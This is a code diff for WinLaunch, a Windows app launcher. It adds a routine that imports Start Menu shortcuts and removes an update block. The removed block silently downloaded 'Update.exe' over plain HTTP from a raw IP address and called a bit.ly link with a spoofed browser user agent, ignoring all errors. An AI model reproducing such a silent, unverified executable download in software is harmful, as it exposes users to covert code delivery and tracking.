@@ -11,6 +11,80 @@ namespace WinLaunch
 {
     partial class MainWindow : Window
     {
+        bool FirstLaunch = false;
+
+        private void AddDefaultApps()
+        {
+            //clear all items 
+            //SBM.IC.Items.Clear();
+
+            string startMenuItems = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs";
+
+            var files = Directory.GetFiles(startMenuItems);
+
+            foreach (var file in files)
+            {
+                if (file.EndsWith(".lnk"))
+                {
+                    AddFile(file);
+                }
+            }
+
+            var subDirectories = Directory.GetDirectories(startMenuItems);
+
+            foreach (var directory in subDirectories)
+            {
+                var directoryFiles = Directory.GetFiles(directory);
+
+                //check if there are at least 2 links in there 
+                int numLnk = 0;
+                foreach (var file in directoryFiles)
+                {
+                    if (file.EndsWith(".lnk"))
+                    {
+                        numLnk++;
+                    }
+                }
+
+                if (numLnk >= 2)
+                {
+                    //create a folder and add all items
+                    SBItem Folder = new SBItem(Path.GetFileName(directory), "Folder", null, "", SBItem.FolderIcon);
+                    Folder.IsFolder = true;
+
+                    int GridIndex = 0;
+                    foreach (var file in directoryFiles)
+                    {
+                        if (file.EndsWith(".lnk"))
+                        {
+                            var item = PrepareFile(file);
+
+                            item.Page = 0;
+                            item.GridIndex = GridIndex;
+
+                            Folder.IC.Items.Add(item);
+
+                            GridIndex++;
+                        }
+                    }
+
+                    SBM.AddItem(Folder);
+                    Folder.UpdateFolderIcon(true);
+                }
+                else
+                {
+                    //not enough items for a folder, add single item instead
+                    foreach (var file in directoryFiles)
+                    {
+                        if (file.EndsWith(".lnk"))
+                        {
+                            AddFile(file);
+                        }
+                    }
+                }
+            }
+        }
+
         private void LoadSettings()
         {
             //Check for updates
@@ -19,47 +93,18 @@ namespace WinLaunch
             //show the welcome dialog if version is new
             if (Assembly.GetExecutingAssembly().GetName().Version > Settings.CurrentSettings.version)
             {
-                JustUpdated = true;
-
-                if (Settings.CurrentSettings.version != new Version("0.0.0.0"))
+                if (Settings.CurrentSettings.version == new Version("0.0.0.0"))
                 {
-                    try
-                    {
-                        //remove old updater 
-                        try
-                        {
-                            if (File.Exists("Update.exe"))
-                                File.Delete("Update.exe");
-                        }
-                        catch (Exception ex) { }
-
-                        try
-                        {
-                            if (File.Exists("WinLaunchUpdate.exe"))
-                                File.Delete("WinLaunchUpdate.exe");
-                        }
-                        catch (Exception ex) { }
-
-                        //download new updater
-                        WebClient downloadUpdater = new WebClient();
-                        downloadUpdater.DownloadFile("http://143.244.213.157/Update.exe", "Update.exe");
-
-                        //successful update callback
-                        WebClient wc = new WebClient();
-                        wc.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36");
-                        wc.DownloadString("https://bit.ly/0550success");
-                    }
-                    catch (Exception ex) { }
+                    FirstLaunch = true;
                 }
+
+                JustUpdated = true;
 
                 Settings.CurrentSettings.version = Assembly.GetExecutingAssembly().GetName().Version;
                 Settings.SaveSettings(Settings.CurrentSettingsPath, Settings.CurrentSettings);
 
                 Welcome welcome = new Welcome();
                 welcome.ShowDialog();
-
-                //show off the new toolbar 
-                ToggleToolbar();
             }
         }
 
